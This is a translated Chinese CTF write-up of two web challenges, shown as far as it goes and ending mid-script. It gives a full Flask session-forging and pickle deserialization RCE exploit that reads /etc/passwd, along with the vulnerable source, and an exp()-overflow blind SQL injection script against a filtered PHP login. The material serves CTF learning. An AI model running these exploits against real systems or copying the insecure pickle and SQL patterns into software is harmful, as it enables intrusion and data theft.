# 2021虎符CTF 线下赛 Web Write Up
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## easyflask
从`/proc/self/environ`
获取环境变量发现里面有`secret_key`可以拿这个`secret_key`伪造session，从而触发源码中的pickle反序列化实现RCE
Exp
    import base64
    import pickle
    from flask.sessions import SecureCookieSessionInterface
    import re
    import pickletools
    import requests
    url = "http://dadc77b3-9752-430c-88f7-30055e8b9f2a.node3.buuoj.cn"
    #url = "http://127.0.0.1:80"
    def get_secret_key():
        target = url + "/file?file=/proc/self/environ"
        r = requests.get(target)
        #print(r.text)
        key = re.findall('key=(.*?)OLDPWD',r.text)
        return str(key[0])
    secret_key = get_secret_key()
    #secret_key = "glzjin22948575858jfjfjufirijidjitg3uiiuuh"
    print(secret_key)
    class FakeApp:
        secret_key = secret_key
    class User(object):
        def __reduce__(self):
            import os
            cmd = "cat /etc/passwd > /tmp/eki"
            return (os.system,(cmd,))
    exp = {
        "b":base64.b64encode(pickle.dumps(User()))
    }
    #pickletools.dis(pickle.dumps(User()))
    #print(pickletools.dis(b'\x80\x03cprogram_main_app@@@\nUser\nq\x00)\x81q\x01.'))
    fake_app = FakeApp()
    session_interface = SecureCookieSessionInterface()
    serializer = session_interface.get_signing_serializer(fake_app)
    cookie = serializer.dumps(
        #{'u': b'\x80\x03cprogram_main_app@@@\nUser\nq\x01)\x81q\x01.'}
        #{'u':b'\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04User\x94\x93\x94.'}
        {'u':exp}
    )
    print(cookie)
    headers = {
        "Accept":"*/*",
        "Cookie":"session={0}".format(cookie)
    }
    req = requests.get(url+"/admin",headers=headers)
    #print(req.text)
    req = requests.get(url+"/file?file=/tmp/eki",headers=headers)
    print(req.text)
###  修复思路
把任意文件读修复就行，赛方的exp应该是每次手动拿secret_key,但是线下的时候以为这个点是正常业务，一直没修成功，心态崩了。
    #!/usr/bin/python3.6
    import os
    import pickle
    from base64 import b64decode
    from flask import Flask, request, render_template, session
    app = Flask(__name__)
    app.config["SECRET_KEY"] = 'you_find_secret_k3y_c0ngratulations'
    User = type('User', (object,), {
        'uname': 'test',
        'is_admin': 0,
        '__repr__': lambda o: o.uname,
    })
    @app.route('/', methods=('GET',))
    def index_handler():
        if not session.get('u'):
            u = pickle.dumps(User())
            session['u'] = u
        return render_template('index.html')
    @app.route('/file', methods=('GET',))
    def file_handler():
        path = request.args.get('file')
        if path.startswith("/"):
            return 'disallowed'
        path = os.path.join('static', path)
        if not os.path.exists(path) or os.path.isdir(path) \
                or '.py' in path or '.sh' in path or '..' in path or "flag" in path or "proc" in path:
            return 'disallowed'
        with open(path, 'r') as fp:
            content = fp.read()
        return content
    @app.route('/admin', methods=('GET',))
    def admin_handler():
        try:
            u = session.get('u')
            if isinstance(u, dict): 
                u = b64decode(u.get('b'))
            if "R" in u:
                return 'uhh?'
            u = pickle.loads(u)
        except Exception:
            return 'uhh?'
        if u.is_admin == 1:
            return 'welcome, admin'
        else:
            return 'who are you?'
    if __name__ == '__main__':
        app.run('0.0.0.0', port=80, debug=True)
## hatenum (BUUOJ 复现)
    conn = new mysqli($this->host,$this->user,$this->pass,$this->database);
            if(mysqli_connect_errno()){
                die('connect error');
            }
        }
        function find($username){
            $res = $this->conn->query("select * from users where username='$username'");
            if($res->num_rows>0){
                return True;
            }
            else{
                return False;
            }
        }
        function register($username,$password,$code){
            if($this->conn->query("insert into users (username,password,code) values ('$username','$password','$code')")){
                return True;
            }
            else{
                return False;
            }
        }
        function login($username,$password,$code){
            $res = $this->conn->query("select * from users where username='$username' and password='$password'");
            if($this->conn->error){
                return 'error';
            }
            else{
                $content = $res->fetch_array();
                if($content['code']===$_POST['code']){
                    $_SESSION['username'] = $content['username'];
                    return 'success';
                }
                else{
                    return 'fail';
                }
            }
        }
    }
    function sql_waf($str){
        if(preg_match('/union|select|or|and|\'|"|sleep|benchmark|regexp|repeat|get_lock|count|=|>| $value) {
            if(is_array($value)){
                array_waf($value);
            }
            else{
                sql_waf($value);
                num_waf($value);
            }
        }
    }
ban了`'` 但是可以通过前后参数联合逃逸
同时可以利用mysql的exp溢出进行盲注
    url = "http://fa57e15a-3cf4-449b-832a-120cca2c6884.node3.buuoj.cn"
    data = {
        "username":"eki\\",
        "password":"||1&&exp(710)#",
        "code":"1"
    }
    req = r.post(url+"/login.php",data=data,allow_redirects=False)
    print(req.text)
    #error
    #exp(709) login fail
    url = "http://fa57e15a-3cf4-449b-832a-120cca2c6884.node3.buuoj.cn"
    data = {
        "username":"eki\\",
        "password":"||1&&exp(710)#",
        "code":"1"
    }
    req = r.post(url+"/login.php",data=data,allow_redirects=False)
    print(req.text)
    #error
    #exp(709) login fail
    import requests as r
    import string
    url = "http://fa57e15a-3cf4-449b-832a-120cca2c6884.node3.buuoj.cn"
    pt = string.ascii_letters+string.digits+"$"
    #/union|select|or|and|\'|"|sleep|benchmark|regexp|repeat|get_lock|count|=|>|<| |\*|,|;|\r|\n|\t|substr|right|left|mid/i
    #select * from users where username='$username' and password='$password'
    def str2hex(raw):
        ret = '0x'
        for i in raw:
            ret += hex(ord(i))[2:].rjust(2,'0')
        return ret
    ans = ""
    tmp = "^"
    for i in range(24):
        for ch in pt:
            #payload = f"||1 && username rlike 0x61646d && exp(710-(23-length(code)))#".replace(' ',chr(0x0c))
            payload = f"||1 && username rlike 0x61646d && exp(710-(code rlike binary {str2hex(tmp+ch)}))#"
            #print(payload)
            payload = payload.replace(' ',chr(0x0c))
            data = {
                "username":"eki\\",
                "password":payload,
                "code":"1"
            }
            req = r.post(url+"/login.php",data=data,allow_redirects=False)
            if 'fail' in req.text:
                ans += ch
                print(tmp+ch,ans)
                if len(tmp) == 3:
                    tmp = tmp[1:]+ch
                else:
                    tmp += ch
                break
    '''
    ^e e
    ^er er
    ^erg erg
    ergh ergh
    rghr erghr
    ghru erghru
    hrui erghrui
    ruig erghruig
    uigh erghruigh
    igh2 erghruigh2
    gh2u erghruigh2u
    h2uy erghruigh2uy
    2uyg erghruigh2uyg
    uygh erghruigh2uygh
    ygh2 erghruigh2uygh2
    gh2u erghruigh2uygh2u
    h2uy erghruigh2uygh2uy
    2uyg erghruigh2uygh2uyg
    uygh erghruigh2uygh2uygh
    '''
    rev_ans = ""
    tmp = "$"
    for i in range(24):
        for ch in pt:
            #payload = f"||1 && username rlike 0x61646d && exp(710-(23-length(code)))#".replace(' ',chr(0x0c))
            payload = f"||1 && username rlike 0x61646d && exp(710-(code rlike binary {str2hex(ch+tmp)}))#"
            #print(payload)
            payload = payload.replace(' ',chr(0x0c))
            data = {
                "username":"eki\\",
                "password":payload,
                "code":"1"